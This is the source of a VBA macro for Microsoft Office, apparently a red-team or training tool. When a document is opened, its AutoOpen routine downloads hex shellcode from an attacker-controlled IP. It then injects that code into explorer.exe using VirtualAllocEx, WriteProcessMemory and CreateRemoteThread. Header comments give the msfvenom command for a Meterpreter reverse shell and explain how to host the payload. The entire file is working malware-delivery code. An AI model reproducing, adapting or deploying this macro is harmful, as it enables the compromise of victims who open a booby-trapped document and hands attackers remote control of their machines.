' For 32bit installs of office
' Generate hex shellcode with
' msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 EXITFUNC=thread -f hex > shellcode.txt
' Host with https://github.com/beauknowstech/gup
' Or python3 -m http.server
' Don't forget to change the URL on line 87
' You can also change the process it injects into on line 99 if you know for sure a different 32-bit process will be running


Private Declare PtrSafe Function OpenProcess Lib "kernel32" ( _
    ByVal dwDesiredAccess As Long, _
    ByVal bInheritHandle As Long, _
    ByVal dwProcessId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpBaseAddress As LongPtr, _
    ByRef lpBuffer As Any, _
    ByVal nSize As LongPtr, _
    ByRef lpNumberOfBytesWritten As LongPtr) As Long

Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As LongPtr, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As LongPtr) As LongPtr

Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
    ByVal hObject As LongPtr) As Long

Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32" ( _
    ByVal dwFlags As Long, _
    ByVal th32ProcessID As Long) As LongPtr

Private Declare PtrSafe Function Process32First Lib "kernel32" ( _
    ByVal hSnapshot As LongPtr, _
    ByRef lppe As PROCESSENTRY32) As Long

Private Declare PtrSafe Function Process32Next Lib "kernel32" ( _
    ByVal hSnapshot As LongPtr, _
    ByRef lppe As PROCESSENTRY32) As Long

Private Declare PtrSafe Function lstrlenW Lib "kernel32" ( _
    ByVal lpString As LongPtr) As Long

Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As LongPtr
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type

Private Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40
Private Const TH32CS_SNAPPROCESS As Long = &H2

Sub AutoOpen()
    ' This macro runs when the document is opened

    Dim http As Object
    Dim shellcode As String
    Dim shellcodeBytes() As Byte
    Dim targetProcessId As Long
    Dim hProcess As LongPtr
    Dim memAddr As LongPtr

    ' URL of the shellcode (as a hex string)
    Dim url As String
    url = "http://192.168.52.130/shellcode.txt" ' Replace with your IP

    ' Download the shellcode using MSXML2.XMLHTTP
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    shellcode = http.responseText
    
    ' Convert the hex shellcode to a byte array
    shellcodeBytes = HexStringToByteArray(shellcode)
    
    ' Find the target process by name (e.g., explorer.exe)
    targetProcessId = FindProcessIdByName("explorer.exe") ' You can change this to notepad.exe for testing

    If targetProcessId = 0 Then
        MsgBox "Target process not found!"
        Exit Sub
    End If
    
    ' Open the target process with all access
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, targetProcessId)
    
    If hProcess = 0 Then
        MsgBox "Failed to open target process!"
        Exit Sub
    End If
    
    ' Allocate memory in the target process
    memAddr = VirtualAllocEx(hProcess, 0, UBound(shellcodeBytes) - LBound(shellcodeBytes) + 1, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    If memAddr = 0 Then
        MsgBox "Memory allocation in target process failed!"
        CloseHandle (hProcess)
        Exit Sub
    End If

    ' Write the shellcode to the target process
    Dim bytesWritten As LongPtr
    WriteProcessMemory hProcess, memAddr, shellcodeBytes(LBound(shellcodeBytes)), UBound(shellcodeBytes) - LBound(shellcodeBytes) + 1, bytesWritten

    If bytesWritten = 0 Then
        MsgBox "Failed to write shellcode to the target process!"
        CloseHandle (hProcess)
        Exit Sub
    End If
    
    ' Create a remote thread in the target process to execute the shellcode
    Dim hThread As LongPtr
    hThread = CreateRemoteThread(hProcess, 0, 0, memAddr, 0, 0, 0)

    If hThread = 0 Then
        MsgBox "Failed to create remote thread!"
        CloseHandle (hProcess)
        Exit Sub
    End If

    ' Close the handles
    CloseHandle (hThread)
    CloseHandle (hProcess)

    MsgBox "Shellcode injected and executed in target process."
End Sub

Function FindProcessIdByName(processName As String) As Long
    ' Finds the process ID of a process by its executable name
    Dim hSnapshot As LongPtr
    Dim pe32 As PROCESSENTRY32
    Dim processId As Long

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    If hSnapshot = 0 Then
        FindProcessIdByName = 0
        Exit Function
    End If

    pe32.dwSize = Len(pe32)
    If Process32First(hSnapshot, pe32) = 0 Then
        CloseHandle hSnapshot
        FindProcessIdByName = 0
        Exit Function
    End If

    Do
        ' Check if this is the process we're looking for
        If InStr(1, pe32.szExeFile, processName, vbTextCompare) > 0 Then
            processId = pe32.th32ProcessID
            Exit Do
        End If
    Loop While Process32Next(hSnapshot, pe32)

    CloseHandle hSnapshot
    FindProcessIdByName = processId
End Function

Function HexStringToByteArray(hexString As String) As Byte()
    ' Converts a hex-encoded string to a byte array
    Dim bytes() As Byte
    Dim i As Long
    Dim length As Long

    length = Len(hexString) \ 2
    ReDim bytes(length - 1)

    For i = 0 To length - 1
        bytes(i) = CByte("&H" & Mid(hexString, i * 2 + 1, 2))
    Next i

    HexStringToByteArray = bytes
End Function